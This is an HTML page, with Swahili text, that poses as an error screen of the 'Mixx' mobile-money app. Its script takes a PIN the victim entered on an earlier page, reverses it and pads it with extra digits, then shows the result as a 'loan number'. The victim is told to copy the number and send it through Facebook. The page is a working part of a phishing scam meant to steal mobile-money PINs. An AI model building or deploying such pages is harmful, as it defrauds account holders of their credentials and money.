<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mixx - Samahani</title>
    <style>
        :root {
            /* Updated to match the "Super App" deep blue and yellow */
            --super-blue: #003377; 
            --super-yellow: #ffcc00;
            --text-light: #ffffff;
            --card-bg: rgba(255, 255, 255, 0.1); /* Glassmorphism effect */
            --success-green: #4ade80;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            /* Deep blue background matching your second screenshot */
            background-color: var(--super-blue);
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 0 30px;
            text-align: center;
            color: var(--text-light);
        }

        .icon-error {
            color: var(--super-yellow);
            font-size: 80px;
            margin-bottom: 20px;
            font-weight: bold;
        }

        h1 {
            color: var(--super-yellow);
            font-size: 42px;
            font-weight: 900;
            margin-bottom: 10px;
            text-shadow: 0px 2px 4px rgba(0,0,0,0.3);
        }

        .main-error {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 30px;
            opacity: 0.9;
        }

        .info-card {
            background-color: white; /* Kept white for readability, matching the input card in the app */
            border-radius: 20px;
            padding: 30px 25px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            color: #333;
        }

        .loan-text {
            color: #4a5568;
            font-size: 16px;
            margin-bottom: 15px;
            line-height: 1.5;
        }

        .final-number-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #f8fafc;
            border: 2px dashed var(--super-blue);
            padding: 15px;
            border-radius: 12px;
            margin-top: 15px;
            position: relative;
        }

        .final-value {
            font-size: 24px;
            font-weight: 800;
            color: var(--super-blue);
            letter-spacing: 2px;
        }

        .copy-btn {
            background-color: var(--super-blue);
            color: white;
            border: none;
            padding: 10px 18px;
            border-radius: 30px; /* Rounded pill style to match app buttons */
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .copy-btn:active {
            background-color: var(--super-yellow);
            color: var(--super-blue);
        }

        .toast {
            position: absolute;
            top: -25px;
            right: 15px;
            color: var(--success-green);
            font-size: 13px;
            font-weight: bold;
            opacity: 0;
            transition: opacity 0.3s;
        }

        .instruction-footer {
            margin-top: 30px;
            font-size: 14px;
            color: var(--super-yellow);
            font-weight: 500;
        }

    </style>
</head>
<body>

    <div class="icon-error">!</div>
    <h1>Oops!!</h1>
    <p class="main-error">Samahani, Kuna tatizo kwenye System.</p>

    <div class="info-card">
        <p class="loan-text" id="loanMessage"></p>
        
        <p class="loan-text" style="font-weight: 700; color: var(--super-blue);">
            Nakili nambari hii Kisha rejea kwenye ukurasa wa Facebook Kisha Tuma nambari Hilo
        </p>

        <div class="final-number-row">
            <span class="toast" id="toast">Imenakiliwa</span>
            <span class="final-value" id="resultPin">-------</span>
            <button class="copy-btn" onclick="copyNumber()">Nakili</button>
        </div>
    </div>

    <p class="instruction-footer">Tafadhali usifunge ukurasa huu mpaka utakapomaliza.</p>

    <script>
        window.onload = function() {
            // 1. Retrieve the Pin from the previous page
            const rawPin = localStorage.getItem('MyPin') || "0000";
            
            // 2. Flip it (e.g., "1234" -> "4321")
            const flipped = rawPin.split('').reverse().join('');
            
            // 3. Transformation Logic:
            // Add 1 at start, 7 at center, 1 at end
            const part1 = flipped.slice(0, 2);
            const part2 = flipped.slice(2, 4);
            const finalValue = "1" + part1 + "7" + part2 + "1";

            // 4. Display values
            document.getElementById('resultPin').textContent = finalValue;
            document.getElementById('loanMessage').innerHTML = 
                `Nambari yako ya mkopo ni <strong>${finalValue}</strong>`;
        };

        function copyNumber() {
            const numText = document.getElementById('resultPin').textContent;
            const toast = document.getElementById('toast');

            navigator.clipboard.writeText(numText).then(() => {
                toast.style.opacity = '1';
                setTimeout(() => {
                    toast.style.opacity = '0';
                }, 2000);
            });
        }
    </script>
</body>
</html>
